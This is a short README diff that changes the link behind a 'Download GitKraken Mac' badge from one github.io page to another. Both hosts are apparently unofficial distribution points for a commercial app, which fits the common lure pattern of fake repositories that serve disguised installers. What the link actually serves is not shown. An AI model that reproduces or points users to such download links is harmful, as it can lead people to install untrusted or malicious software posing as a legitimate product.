@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![📥 Download GitKraken Mac](https://img.shields.io/badge/📥_Download_GitKraken_Mac-blue?style=for-the-badge&logo=apple)](https://osx-app.github.io/.github/gitkraken)
+[![📥 Download GitKraken Mac](https://img.shields.io/badge/📥_Download_GitKraken_Mac-blue?style=for-the-badge&logo=apple)](https://tubus-jubus-apps.github.io/.github/gitkraken)
 
 </div>
 
